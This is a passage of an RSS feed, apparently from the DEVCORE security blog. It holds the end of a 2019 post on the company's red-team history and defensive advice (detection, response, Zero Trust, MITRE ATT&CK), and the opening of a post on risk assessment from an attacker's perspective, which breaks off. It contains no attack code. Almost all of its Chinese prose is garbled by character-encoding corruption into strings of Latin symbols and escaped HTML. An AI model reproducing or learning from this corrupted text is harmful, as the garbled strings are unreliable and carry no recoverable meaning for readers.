&lt;p&gt;ÊúÄÂæå‰∏ÄÈªûÔºåÊàëÊÉ≥ÂàÜ‰∫´ÁöÑÊòØÔºöÂú®Á†îÁ©∂ÊàñËÄÖÊ∏¨Ë©¶ÁöÑÈÅéÁ®ãÁï∂‰∏≠ÔºåÊúâÊôÇÂÄôÊúÉËä±Ë≤ªÂæàÂ§öÊôÇÈñìÂçªÊ≤íÊúâÊàêÊûúÔºå‰ΩÜÊòØÂ¶ÇÊûú‰Ω†Ë©ï‰º∞ÊòØÊúâÊ©üÊúÉÔºåÈÇ£Â∞±Áõ∏‰ø°Ëá™Â∑±ÔºåËä±ÊôÇÈñìÂÅö‰∏ãÂéªÂêßÔºÅ
ÊàëÂÄëÊúâ‰∏ÄÂÄãËä±Ë≤ª‰∏ÄÂÄãÊúàÁöÑ‰æãÂ≠êÔºåÊòØ‰πãÂâç&lt;a href=&quot;https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way/&quot;&gt;Á†¥Ëß£ IDA Pro ÂÅΩÈö®Ê©üÊï∏&lt;/a&gt;ÁöÑÁ†îÁ©∂ÔºåÈÄôÂÄã‰∫ã‰ª∂ÊÑèÂ§ñÂú® binary ÂúàÂæàÊúâÂêçÔºåÁîöËá≥ÈÇÑÊúâ‰∫∫ÂØ´Êàê&lt;a href=&quot;https://medium.com/the-singularity-is-near/recent-leak-of-ida-pro-7-2-a-brief-timeline-4c1dcbe6331e&quot;&gt;‰∫ã‰ª∂Êá∂‰∫∫ÂåÖ&lt;/a&gt;„ÄÇÈÄôÂÄãÁ†îÁ©∂ÊòØÂú®Êé¢Ë®éÂ¶ÇÊûúÊàëÂÄëÊ≤íÊúâÂÆâË£ùÂØÜÁ¢ºÔºåÊúâÊ©üÊúÉÂÆâË£ù IDA PRO ÂóéÔºüÁµêÊûúÊúÄÂæåÊàëÂÄëÊÉ≥Ëæ¶Ê≥ïÈÄÜÊé®Âá∫‰∫Ü IDA ÂØÜÁ¢ºÁî¢ÁîüÂô®ÁöÑÁÆóÊ≥ïÔºåÁü•ÈÅìÂÅΩÈö®Ê©üÊï∏‰ΩøÁî®‰∫ÜÂì™‰∫õÂ≠óÂÖÉÔºåÂíåÂÆÉÁöÑÊ≠£Á¢∫ÊéíÂ∫è„ÄÇÈÄô‰ª∂‰∫ãÊÉÖÁöÑÈõ£Â∫¶Â∑≤Á∂ì‰∏çÂè™Âú®ÊäÄË°ì‰∏äÔºåËÄåÂú®ÊñºË¶ÅÁåúÂá∫ÂÅΩÈö®Ê©üÊï∏‰ΩøÁî®ÁöÑÂ≠óÂÖÉÈõÜÈ†ÜÂ∫èÔºåÈÇÑË¶ÅÂêåÊôÇÁåúÂá∫Â∞çÊñπ‰ΩøÁî®ÁöÑÊºîÁÆóÊ≥ïÔºàËá≥Â∞ëÊúâ88Á®ÆÔºâ„ÄÇËÄå‰∏îÊàëÂÄëÊØèÈ©óË≠â‰∏ÄÁ®ÆÊéíÂàóÁµÑÂêàÔºåÂ∞±ÊúÉËä±ÂçäÂ§©ÊôÇÈñìÂíå 100GB ÁöÑÁ©∫ÈñìÔºåÁ¥ØÁ©çÊàêÊú¨ÊªøÈ´òÁöÑ„ÄÇ‰ΩÜÊàëÂÄëÊ†πÊìöÁ∂ìÈ©óÁõ∏‰ø°ÈÄôÊòØÊúâÊ©üÊúÉÊàêÂäüÁöÑÔºå‰∏¶‰∏îÊäïÊ≥®Ë≥áÊ∫êÂ†ÖÊåÅ‰∏ãÂéªÔºåÊúÄÂæåÊúâ‰∫ÜÂæà‰∏çÈåØÁöÑÊàêÊûú„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈÄôË£°‰∏çÊòØÂú®ÈºìÂãµ‰∏ÄÊÑèÂ≠§Ë°åÔºåËÄåÊòØ‰∏ÄÁ®ÆÂøÉÁêÜÁ¥†Ë≥™ÔºöÊòØÂú®Èù¢Ëá®Âç°ÈóúÁöÑÊôÇÂÄôÔºåÊúâË∂≥Â§†ÁöÑÂà§Êñ∑ÂäõÔºåÊñπÂêëÈåØË™§ËÉΩÊûúÊñ∑ÊîæÊ£ÑÔºåÂ¶ÇÊûúÊñπÂêëÊ≠£Á¢∫Ë¶ÅÊúâÂ†ÖÊåÅ‰∏ãÂéªÁöÑÂãáÊ∞£„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;Ë≥áÂÆâÈò≤Ë≠∑Ë∂®Âã¢ËàáÁ¥ÖÈöäÁöÑ‰∏ã‰∏ÄÊ≠•&quot;&gt;Ë≥áÂÆâÈò≤Ë≠∑Ë∂®Âã¢ËàáÁ¥ÖÈöäÁöÑ‰∏ã‰∏ÄÊ≠•&lt;/h2&gt;

&lt;p&gt;ÊñáÁ´†ÁöÑÊúÄÂæå‰∏ÄÈÉ®ÂàÜË¶ÅË´áÁöÑÊòØÁ¥ÖÈöäÊºîÁ∑¥ÁöÑÊú™‰æÜÔºå‰πüÊòØÈÄôÁØáÊñáÁ´†ÁöÑÈáçÈªûÔºåÊú™‰æÜÔºåÊàëÂÄëÂ∏åÊúõÂèØ‰ª•Ëß£Ê±∫‰ªÄÈ∫ºÂïèÈ°åÔºü&lt;/p&gt;

&lt;p&gt;ÂÅöÁÇ∫Á¥ÖÈöäÊºîÁ∑¥ÁöÑÈ†òÂ∞éÂª†ÂïÜÔºåÂæû 2017 Âπ¥ÊºîÁ∑¥Âà∞ÁèæÂú®ÊàëÂÄëÈÄ≤ÂÖ•Âè∞ÁÅ£‰ºÅÊ•≠ÂÖßÁ∂≤ÁöÑÊàêÂäüÁéáÊòØ 100%„ÄÇÊàëÂÄëÂú®Ë∂ÖÈÅéÂÖ≠ÊàêÁöÑÊºîÁ∑¥Ê°à‰∏≠ÊãøÂà∞ AD ÁÆ°ÁêÜÊ¨äÈôêÔºåÈÄôÈÇÑ‰∏çÂê´ÈÇ£‰∫õ‰∏çÊòØÁî® AD ‰æÜÁÆ°ÁêÜÁöÑ‰ºÅÊ•≠„ÄÇÊàëÂÄëÁôºÁèæÈÄ≤ÂÖ•ÂÖßÁ∂≤ÂæåÔºåÈÄöÂ∏∏‰∏çÊúÉÊúâ‰ªÄÈ∫ºÈòªÁ§ôÔºåÂ∞±Â•ΩÂÉèËÆäÊàêÂÖßÈÉ®Âì°Â∑•ÔºåÊâì‰∫ÜËÅ≤ÊãõÂëºÂ∞±ÂèØ‰ª•ÈÄ≤Ê©üÊàø„ÄÇÊÉ≥Ë¶ÅÊèêÈÜíÂ§ßÂÆ∂ÁöÑÊòØÔºöÂ∞çÈ†ÇÂ∞ñÊîªÊìäÂúòÈöäËÄåË®ÄÔºåÈÄ≤ÂÖ•‰ºÅÊ•≠ÂÖßÁ∂≤ÁöÑÈõ£Â∫¶‰∏¶‰∏çÈ´ò„ÄÇÂ¶ÇÊûúÁ¢∞‰∏äÈ†ÇÂ∞ñÁöÑÈß≠ÂÆ¢ÔºåÊàñÊòØ‰∏ÄÂÄã 0dayÔºå‰ºÅÊ•≠Ê∫ñÂÇôÂ•Ω‰∫ÜÂóéÔºüÈÄôÂ∞±ÊòØÁèæÈöéÊÆµÊàëÂÄëÊâÄÁôºÁèæÁöÑÂïèÈ°åÔºÅ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191024/4.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âú®Ë™™Âà∞ÊäµÁ¶¶ÊîªÊìäÈÄöÂ∏∏ÊúÉÊúâ‰∏âÂÄãÈù¢ÂêëÔºåÂàÜÂà•ÊòØ„ÄåÈ†êÈò≤„Äç„ÄÅ„ÄåÂÅµÊ∏¨„ÄçÂíå„ÄåÂõûÊáâ„Äç„ÄÇ‰∏ÄËà¨ËÄåË®Ä‰ºÅÊ•≠Âú®„ÄåÈ†êÈò≤„ÄçÈÄôÈÉ®‰ªΩÂÅöÁöÑÊØîËºÉÂÆåÂñÑÔºåÂ∞çÊñºÂ∑≤Áü•ÁöÑÂº±ÈªûÈÉΩÊúâÊØîËºÉÈ´òÁöÑÊéåÊè°Â∫¶„ÄÇ‰ªäÂ§©ÊôÆÈÅçÁöÑÂïèÈ°åÂú®„Äå&lt;strong&gt;ÂÅµÊ∏¨&lt;/strong&gt;„ÄçÂíå„Äå&lt;strong&gt;ÂõûÊáâ&lt;/strong&gt;„Äç‰∏äÔºå‰ºÅÊ•≠ËÉΩ‰∏çËÉΩÁôºÁèæÊúâ‰∫∫Âú®Â∞ç‰Ω†ÈÄ≤Ë°åÊîªÊìäÔºüÊàñÊòØÁü•ÈÅìË¢´ÊîªÊìäÂæåÊúâÊ≤íÊúâËÉΩÂäõÂç≥ÊôÇÂõûÊáâ‰∏¶‰∏îÊ†πÁµïÊ∫êÈ†≠ÔºüÈÄôÂÖ©‰ª∂‰∫ãÊÉÖÂÅöÂæóÁõ∏Â∞ç‰∏çÂ•ΩÁöÑÂéüÂõ†‰∏¶‰∏çÊòØ‰ºÅÊ•≠Ê≤íÊúâÊäïÂÖ•Ë≥áÊ∫êÂú®‰∏äÈù¢ÔºåËÄåÊòØÂ∞çÊñº‰ºÅÊ•≠‰æÜË™™Â§™Èõ£È©óË≠âÔºåÂæàÈõ£ÊúâÂÄãÊ®ôÊ∫ñÂéªÁ¢∫ÂÆöÁõÆÂâçÁöÑÊ©üÂà∂ÊúâÊ≤íÊúâÊïàÊàñÊòØË≤∑‰∫ÜË®≠ÂÇôÊúâÊ≤íÊúâ‰ΩúÁî®ÔºåÂ∞±ÁÆóÊúâËóçÈöäÈÄöÂ∏∏‰πüÊ≤íÊúâÂª∫Á´ãÂÆåÂñÑÁöÑÊáâÂ∞ç SOPÔºåÁï¢Á´üÈß≠ÂÆ¢ÂÖ•‰æµ‰∏çÊúÉÊòØÂ§©Â§©ÁôºÁîüÁöÑ‰∫ãÊÉÖ„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊâÄ‰ª•ÔºåÊàëÂÄëÂ∏åÊúõ‰ºÅÊ•≠ËÉΩÂæûÁ¥ÖÈöäÊºîÁ∑¥‰∏≠ÔºåË®ìÁ∑¥Â∞çÊîªÊìä‰∫ã‰ª∂ÁöÑÂÅµÊ∏¨ÂíåÂèçÊáâËÉΩÂäõ„ÄÇÊàñÊòØË™™ÔºåÁ¥ÖÈöäÊºîÁ∑¥ÁöÑÊú¨Ë≥™Â∞±ÊòØÂú®ÁúüÂØ¶ÁöÑÊºîÁ∑¥ÔºåÈÄèÈÅéÊîªÈò≤Âπ´Âä©‰ºÅÊ•≠‰∫ÜËß£Ëá™Â∑±ÁöÑÂº±È†Ö„ÄÇÈÅéÂéªÂè∞ÁÅ£ÁöÑÁ¥ÖÈöäÊúçÂãôÈÉΩÊúÉÂº∑Ë™øÂú®ÊâæÂá∫Êï¥ÂÄã‰ºÅÊ•≠ÁöÑÂº±ÈªûÔºåÊâæÂá∫ÊºèÊ¥ûÂõ∫ÁÑ∂ÈáçË¶ÅÔºå‰ΩÜÁ¢∞Âà∞ÂÉèÊàëÂÄë‰∏ÄÊ®£ÂæàÂ∏∏ÊâæÂà∞ 0-day ÁöÑÁµÑÁπîÔºåÊúâÂÅµÊ∏¨ÂíåÂõûÊáâËÉΩÂäõÊâçÊòØÊúÄÂæåËÉΩÊïë‰Ω†‰∏ÄÂëΩÁöÑÁ°¨ÊäÄËÉΩ„ÄÇÊèõÂÄãËßíÂ∫¶‰æÜÁúãÔºåÁõÆÂâç‰∏ñÁïå‰∏äÊúÄÂÆåÊï¥ÁöÑÊîªÊìäÊà∞Áï•ÂíåÊäÄË°ìÊâãÊ≥ïÂàóË°®ÊòØ &lt;a href=&quot;https://attack.mitre.org/&quot;&gt;MITRE ATT&amp;amp;CK Framework&lt;/a&gt;Ôºå‰∏ÄÂÄãÂ∞ç‰ºÅÊ•≠ÊúâÂÇ∑ÂÆ≥ÁöÑÊîªÊìäË°åÂãïÈÄöÂ∏∏ÊúÉÊòØÂæàÂ§öÂÄãÊîªÊìäÊâãÊ≥ïÊâÄÁµÑÊàêÁöÑÊîªÊìäÈèàÔºåËÄåÂú®ÈÄôÂÄã Framework ‰∏≠ÔºåÊâæÂà∞Ëµ∑ÂßãÂº±ÈªûÈÄô‰ª∂‰∫ãÊÉÖÂÉÖ‰Ωî‰∫ÜÊï¥ÂÄãÊîªÊìäÈèà‰∏çÂà∞‰∏ÄÊàêÔºå‰ºÅÊ•≠Â¶ÇÊûúËÉΩÂ§†ÊäïÊ≥®Âú®ÂÖ∂‰ªñ‰πùÊàêÊâãÊ≥ïÁöÑÂÅµÊ∏¨ËÉΩÂäõ‰∏ä‰∏¶ÈòªÊñ∑ÂÖ∂‰∏≠‰ªª‰∏ÄÁí∞ÁØÄÔºåÂ∞±ÊúâÊ©üÊúÉËÆìÊï¥ÂÄãÊîªÊìäË°åÂãïÂ§±ÊïóËÄå‰øùË≠∑Âà∞Ë≥áÁî¢„ÄÇ&lt;/p&gt;

&lt;p&gt;Ë¶ÅË™™ÁöÑÊòØÔºåÊàëÂÄëÁ¥ÖÈöäÊºîÁ∑¥Èô§‰∫ÜÊâæÂá∫‰ºÅÊ•≠ÊºèÊ¥ûËÉΩÂäõÈ†ÇÂ∞ñ‰πãÂ§ñÔºå‰πüÁ¥ØÁ©ç‰∫ÜÂæàË±êÂØåÁöÑÂÖßÁ∂≤Êª≤ÈÄèÁ∂ìÈ©óÂèäÊäÄÂ∑ßÔºåÊàëÂÄëÂæàÊ®ÇÊÑèÈÄèÈÅéÊºîÁ∑¥ÂçîÂä©‰ºÅÊ•≠Âä†Âº∑ÁúüÂØ¶ÁöÑÂÅµÊ∏¨ÂíåÂõûÊáâËÉΩÂäõ„ÄÇÊº∏Êº∏ÁöÑÔºåÊú™‰æÜÁ¥ÖÈöäÊúÉÊÖ¢ÊÖ¢ËëóÈáçÂú®ÂíåËóçÈöäÁöÑÊîªÈò≤ÊºîÁ∑¥„ÄÇÊúÉÂº∑Ë™øÊì¨ÂÆöÊà∞Áï•ÔºåËÆì‰ºÅÊ•≠‰∫ÜËß£Ëá™Â∑±Â∞çÂì™‰∫õÊîªÊìäÁöÑÈò≤Á¶¶ËÉΩÂäõÊØîËºÉÂº±ÔºåÈÄ≤ËÄåÂéªÊîπÂñÑ„ÄÇÊú™‰æÜÁöÑÁ¥ÖÈöä‰πüÊõ¥ÈúÄË¶ÅÂº∑Ë™øËàáÈò≤Á¶¶Ê©üÂà∂‰∫§ÊâãÁöÑÁ∂ìÈ©óÔºå‰∫ÜËß£Èò≤Á¶¶ÁöÑÊ•µÈôêÔºåÊâçÊúâËæ¶Ê≥ïÊâæÂà∞Ë®≠ÂÇôË®≠ÂÆö‰∏çÂÖ®ÊàñÊòØÊ∂µËìãÁéá‰∏çË∂≥ÁöÑÁõ≤Èªû„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊúÄÂæåÊàëÂÄë‰πüÊúâ‰∫õË¶èÂäÉÂª∫Ë≠∞Áµ¶Â∞çË≥áÂÆâÈò≤Á¶¶ÊØîËºÉÊàêÁÜüÁöÑ‰ºÅÊ•≠Â¶Ç‰∏ãÔºåÈÄêÊ≠•ËêΩÂØ¶ÂèØ‰ª•Â∞áË≥áÂÆâÈ´îË≥™ÊèêÊòá‰∏ÄÂÄãÂ±§Ê¨°„ÄÇÔºàËá≥Â∞ëÂæûÊàëÂÄëÁöÑÁ∂ìÈ©ó‰æÜÁúãÔºåÊúâÈÄô‰∫õÊ¶ÇÂøµÁöÑ‰ºÅÊ•≠ÈÉΩÊòØÁâπÂà•Èõ£ÊîªÊìäÈÅîÊàêÁõÆÊ®ôÁöÑÔºâ&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Â¶ÇÊûúÂ§ñÁ∂≤ÂÆâÂÖ®Â∑≤ÊäïË≥áÂ§öÂπ¥ÔºåÈñãÂßãÊÄùËÄÉ„Äå&lt;strong&gt;Â¶ÇÊûúÈß≠ÂÆ¢Â∑≤Á∂ìÂú®ÂÖßÁ∂≤&lt;/strong&gt;„ÄçÁöÑÈò≤Á¶¶Á≠ñÁï•&lt;/li&gt;
  &lt;li&gt;Áõ§ÈªûÂá∫ÊúÄ‰∏çÂèØ‰ª•Ë¢´Ê¥©ÊºèÁöÑÈáçË¶ÅË≥áÊñôÔºåÂæûÈÄô‰∫õÂú∞ÊñπÈñãÂßãÂ•âË°å &lt;strong&gt;Zero Trust&lt;/strong&gt; Ê¶ÇÂøµ&lt;/li&gt;
  &lt;li&gt;‰ºÅÊ•≠ÂÖßÈÉ®ÈúÄË¶ÅÊúâÂ∞àËÅ∑Ë≥áÂÆâ‰∫∫Âì°Á∑®Âà∂ÔºàËóçÈöäÔºâ&lt;/li&gt;
  &lt;li&gt;ÈÄèÈÅéËàáÊúâÁ∂ìÈ©óÁöÑÁ¥ÖÈöäÂêà‰ΩúÔºåÂÖ®Áõ§Ê™¢Ë¶ñÈò≤Á¶¶Áõ≤Èªû&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;ÂæåË®ò&quot;&gt;ÂæåË®ò&lt;/h2&gt;

&lt;p&gt;Á†îË®éÊúÉÂÖßÂÆπÂà∞ÈÄôÈÇäÂ∞±ÁµêÊùü‰∫Ü„ÄÇÂØ´Âú®ÊúÄÂæåÁöÑÊúÄÂæåÔºåÊòØÂÖÖÊªøËëóÊÑüË¨ù„ÄÇÂÖ∂ÂØ¶ÁÑ°Ë´ñÊª≤ÈÄèÊ∏¨Ë©¶ÈÇÑÊòØÁ¥ÖÈöäÊºîÁ∑¥ÔºåÂú®‰∏ÄÈñãÂßãÈÉΩ‰∏çÊòØ‰∫∫‰∫∫ÂèØ‰ª•Êé•ÂèóÁöÑÔºåËÄåÊ∏¨Ë©¶ÁöÑÂÉπÂÄº‰πü‰∏çÊòØÊàëÂÄëË™™‰∫ÜÁÆó„ÄÇ‰∏ÄË∑ØËµ∞‰æÜÔºåÊº∏Êº∏Êº∏Êº∏ÊÑüÂèóÂà∞ÈñãÂßãÊúâ‰∫∫Áõ∏‰ø°ÊàëÂÄëÔºåÂæûÊó©ÊúüÊØîËºÉÂ§öÊ∏¨Ë©¶ÊôÇËàáÂ∑•Á®ãÂ∏´ÂíåÁ∂≤ÁÆ°‰∫∫Âì°ÁöÑÂ∞çÁ´ãÔºåÂà∞ËøëÊúüË∂ä‰æÜË∂äÂ§ö open mind„ÄÅÂ∞±ÊòØÊÉ≥ÊâæÂá∫ÂïèÈ°åÁöÑÂÆ¢Êà∂ÔºåÊòØÊªøÂ§ßÁöÑÂ∞çÊØî„ÄÇÈùûÂ∏∏ÊÑüË¨ù‰ªñÂÄëÁöÑ‰ø°‰ªªÔºå‰πüÂõ†ÁÇ∫ÈÄôÊ®£ÁöÑ‰∫í‰ø°ÔºåÊàëÂÄëÂæó‰ª•ÁØÄÁúÅÊôÇÈñìÂÆåÊàêÊõ¥Ê£íÁöÑÁî¢Âá∫„ÄÇÊªøÊ®ÇË¶ãÂè∞ÁÅ£Ë≥áË®äÁî¢Ê•≠ÊòØÈÄôÊ®£Ê≠£ÂêëÈù¢Â∞çÂïèÈ°åÔºåÊºèÊ¥ûÂ≠òÂú®Â∞±ÊòØÂ≠òÂú®Ôºå‰∏çÊúÉÂõ†ÁÇ∫Ë¶ñËÄå‰∏çË¶ãËÄåÁúüÁöÑ‰∏çË¶ãÔºåÊÑèË≠òÂà∞ÊúâÂïèÈ°åËß£Ê±∫‰∫ÜÂ∞±Â•Ω„ÄÇÊâÄ‰ª•ÊàëÂú®ÊºîË¨õÊúÄÂæåÁïô‰∏ãÈÄôÊ®£‰∏ÄÂè•Ôºö„Äé&lt;strong&gt;Á¥ÖÈöäÊºîÁ∑¥ÁöÑÁ≤æÈ´ì‰∏çÊòØÂú®ÂëäË®¥‰Ω†ÊúâÂ§öËÑÜÂº±ÔºåÂú®ÊñºÁúüÊ≠£Â£û‰∫∫ÈóñÂÖ•ÊôÇ‰Ω†ÂèØ‰ª•Áç®Áï∂‰∏ÄÈù¢Êìã‰∏ã&lt;/strong&gt;„ÄèÔºåÂ∏åÊúõË∂ä‰æÜË∂äÂ§ö‰∫∫ËÉΩÊ≠£Èù¢Â∞çÂæÖÂïèÈ°åÔºåÂêåÊôÇ‰πüÂÇ≥ÈÅûÊàëÂÄëÊÉ≥Ë¶ÅÂÅöÂà∞ÁöÑÂÉπÂÄº„ÄÇ&lt;/p&gt;

&lt;p&gt;2019 DEVCORE CONFÔºåË¨ùË¨ùÈÅéÂéªÂêà‰ΩúÁöÑÊúãÂèãÂÄëÂèÉËàáËÆì DEVCORE Á¥ÖÈöäÂæó‰ª•ÈÄ≤ÂåñÔºåÂ∏åÊúõ‰∏ã‰∏ÄÊ≠•‰πüËÉΩÊúâ‰Ω†ÔºåÊàëÂÄëÊòéÂπ¥Ë¶ã :)&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2019/10/24/evolution-of-DEVCORE-red-team-and-the-next/</link>
                <guid>https://devco.re/blog/2019/10/24/evolution-of-DEVCORE-red-team-and-the-next</guid>
                <pubDate>Thu, 24 Oct 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>‰ª•ÊîªÊìäËÄÖÁöÑËßíÂ∫¶Âà∂ÂÆöÈò≤Á¶¶Á≠ñÁï•</title>
                <description>&lt;style type=&quot;text/css&quot;&gt;
    table {
        display: block;
        width: 100%;
        overflow: auto;
        word-break: normal;
        word-break: keep-all;
        font-size: smaller;
    }

    table th {
        font-weight: bold
    }

    table th,
    table td {
        padding: 5px 11px;
        border: 1px solid #ddd;
    }

    table tr {
        background-color: #fff;
        border-top: 1px solid #ccc;
    }

    table tr:nth-child(2n) {
        background-color: #f8f8f8;
    }
&lt;/style&gt;

&lt;h2 id=&quot;ÂâçË®Ä&quot;&gt;ÂâçË®Ä&lt;/h2&gt;
&lt;p&gt;ÈÄôÁØáÊñáÁ´†Ê∫êËá™ÊñºÂÖ¨Âè∏‰ªäÂπ¥Á¨¨‰∏ÄÊ¨°Ë©¶Ëæ¶ÁöÑÁ†îË®éÊúÉ &lt;a href=&quot;https://devco.re/conf/2019/&quot;&gt;DEVCORE CONFERENCE 2019&lt;/a&gt;ÔºåÊàëÂÄëÊ±∫ÂÆöÂè¶Â§ñÂØ´Êàê blog ÂàÜ‰∫´Âá∫‰æÜÔºåËÆìÁÑ°Ê≥ïÂèÉÂä†ÁöÑÊúãÂèã‰πüÂèØ‰ª•Âæû‰∏çÂêåËßíÂ∫¶ÈáçÊñ∞ÊÄùËÄÉÈò≤Á¶¶Á≠ñÁï•„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊúÉÊÉ≥Âú®Á¥îÊäÄË°ìÂ∞éÂêëÁöÑÁ†îË®éÊúÉ‰∏≠Âä†ÂÖ•Á≠ñÁï•Èù¢ÁöÑË≠∞È°åÔºåÂÖ∂ÂØ¶Ë∑ü‰ªäÂπ¥Á†îË®éÊúÉÁöÑ‰∏ªËª∏„Äå&lt;strong&gt;ÂæûÁ≠ñÁï•Êì¨ÂÆöÊéßÂà∂ÔºåÂæûÊéßÂà∂ÂèçÊò†ÊÑèË≠ò&lt;/strong&gt;„ÄçÊúâÈóú„ÄÇÂ¶ÇÊûú‰ºÅÊ•≠Áº∫‰πèÈï∑ÈÅ†Ê≠£Á¢∫ÁöÑË≥áÂÆâÁ≠ñÁï•ÔºåÈô§‰∫ÜÊäïÂÖ•ÁöÑË≥áÊ∫êÁÑ°Ê≥ïÈÅîÂà∞‰ºÅÊ•≠È†êÊúüÁöÑÊïàÁõä„ÄÅ‰∏ÄÁ∑öË≥áÂÆâ‰∫∫Âì°Áñ≤ÊñºÂ•îÂëΩÂ§ñÔºåÁÆ°ÁêÜÈöéÂ±§Âú®Ë≥áË®ä‰∏çÂ∞çÁ®±ÁöÑÊÉÖÊ≥Å‰∏ãË™çÁÇ∫ÊäïÂÖ•ÁöÑË≥áÊ∫êÂ∑≤Á∂ìË∂≥Â§†ÂÆâÂÖ®ÔºåÊúÄÁµÇÂΩ¢ÊàêÊÉ°ÊÄßÂæ™Áí∞ÔºåÂè™ËÉΩÂú®ÊØèÊ¨°Ë≥áÂÆâ‰∫ãÊïÖÂæåË∑üËëóÊôÇ‰∏ãÊµÅË°åÈÅ∏ÊìáÊúÄÂ§ØË≥áÂÆâÁöÑÁî¢ÂìÅ„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;ÁêÜÊÉ≥‰∏≠ÁöÑÈò≤Á¶¶Á≠ñÁï•&quot;&gt;ÁêÜÊÉ≥‰∏≠ÁöÑÈò≤Á¶¶Á≠ñÁï•&lt;/h2&gt;
&lt;p&gt;ËÄåÊúÄÂª£ÁÇ∫‰∫∫Áü•ÁöÑÈò≤Á¶¶Á≠ñÁï•ÂèØËÉΩÊòØÁ∏±Ê∑±Èò≤Á¶¶Ôºå‰ª•‰∏çÂêåÈ°ûÂûãÁöÑÊéßÂà∂Êé™ÊñΩ (Ë®≠ÂÇô„ÄÅÂà∂Â∫¶„ÄÅÊúçÂãô) Ê∏õÂ∞ëÊïµ‰∫∫ÂÖ•‰æµÁöÑÂèØËÉΩÊÄß„ÄÅÂÑòÈáèÊ∏õÂ∞ëÂñÆ‰∏ÄÊéßÂà∂Êé™ÊñΩÂ§±ÊïàÈÄ†ÊàêÁöÑÈ¢®Èö™„ÄÇÁÑ∂ËÄåÔºåÈÄôÂÄãÊ¶ÇÂøµÊúâÂπæÂÄãÈúÄË¶ÅÊÄùËÄÉÁöÑÈáçÈªû&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Èò≤Ë≠∑ÈÇäÁïåÈÅ†Â§ßÊñº‰ºÅÊ•≠ÁöÑÊÉ≥ÂÉèÔºöÂ∞éËá¥ÁÑ°Ê≥ïÊéåÊè°‰ºÅÊ•≠ÂèØËÉΩÁöÑÂÖ•‰æµÈªû„ÄÇ&lt;/li&gt;
  &lt;li&gt;Â∞çË≥áÂÆâË®≠ÂÇôË™çÁü•ÈåØË™§ÔºöÈÄôËÆìÊïµ‰∫∫ÂèØ‰ª•ÁπûÈÅéË≥áÂÆâË®≠ÂÇôÔºåÊàñÊòØË®≠ÂÇôÊ≤íÊúâÁôºÊèÆ‰ºÅÊ•≠È†êÊúüÁöÑÊïàÁî®„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁÆ°ÁêÜÁ®ãÂ∫è‰∏çÂ§†ËêΩÂØ¶ÔºöÂ∞éËá¥ÊéßÂà∂Êé™ÊñΩÁî¢ÁîüÊñ∞ÁöÑÊºèÊ¥ûÔºåË≠¨Â¶ÇÈ†êË®≠ÂØÜÁ¢ºÊ≤íÊúâÊõ¥ÊîπÔºåÂ∞éËá¥ VPN ÊàñÁ∂≤Ë∑ØË®≠ÂÇôÂèØ‰ª•Áõ¥Êé•Ë¢´Â≠òÂèñ„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÂøΩË¶ñÈáçË¶ÅË≥áÁî¢Áõ∏ÈóúÊÄßÔºöÂè™Â∞áÈò≤Á¶¶Ë≥áÊ∫êÊäïÊ≥®Âú®ÈáçË¶ÅË≥áÁî¢Êú¨Ë∫´ÔºåËÄåËºïÂøΩËàáÂÖ∂Áõ∏ÈÄ£ÁöÑË≥áÁî¢„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÈÄô‰∏ÄÈÄ£‰∏≤ÁöÑÁñèÂøΩÔºåÂèØËÉΩÊàêÁÇ∫ÊîªÊìäËÄÖÂÖ•‰æµÁöÑË∑ØÂæëÔºåÂ∞±ÊòØÊâÄË¨ÇÁöÑÁëûÂ£´Ëµ∑Âè∏Ê®°Âûã ÔºàSwiss Cheese Model)ÔºåÂõ†Ê≠§‰ºÅÊ•≠ÊúüÊúõÈÄèÈÅéÈ¢®Èö™Ë©ïÈëë (Risk Assessment) ‰æÜÁõ§ÈªûÂá∫ÂèØËÉΩÁöÑÁñèÂ§±Ôºå‰∏¶‰∏îÂú®Ê¨äË°°Ë≥áÊ∫ê‰∏ãÔºåÁ¢∫‰øùÂ∞áÈáçÂøÉÊîæÂú®È´òÈ¢®Èö™ÈúÄË¶ÅÂÑ™ÂÖàËôïÁêÜÁöÑÈ†ÖÁõÆ„ÄÇ&lt;/p&gt;

&lt;p&gt;‰ΩÜÊàëÂÄëÊÉ≥ËÅäËÅäÈÄôÂÄãÂ∑•ÂÖ∑Âú®ÂØ¶Âãô‰∏äÊúâÂÆÉÈõ£‰ª•ÂÆåÂñÑ‰πãËôïÔºå‰ª•ÂèäÂæûÊîªÊìäËÄÖÁöÑËßíÂ∫¶ÊòØÊÄéÊ®£ÁúãÂæÖÈÄôÂÄãÊì¨Ë®ÇÈò≤Á¶¶Á≠ñÁï•Ê†∏ÂøÉÂ∑•ÂÖ∑ÔºåÊàëÂÄëÊúÉÈáùÂ∞ç‰∏Ä‰∏ãË≠∞È°å‰æùÂ∫èË™™Êòé&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;ÁúüÂØ¶È¢®Èö™ÂÖ∂ÂØ¶Ë§áÈõúÁöÑÈõ£‰ª•Ë©ï‰º∞&lt;/li&gt;
  &lt;li&gt;ÁèæË°åÈ¢®Èö™Ë©ïÈëëÊñπÂºèÂèØËÉΩÁöÑÂÅèÂ∑Æ&lt;/li&gt;
  &lt;li&gt;ÂæûÊîªÊìäËÄÖÁöÑËßíÂ∫¶ÊîπÂñÑÈ¢®Èö™Ë©ïÈëë&lt;/li&gt;
  &lt;li&gt;ÊåëÈÅ∏ÈÅ©ÂêàÁöÑÊñπÊ≥ïÊîπÂñÑÈ¢®Èö™Ë©ïÈëë&lt;/li&gt;
&lt;/ul&gt;

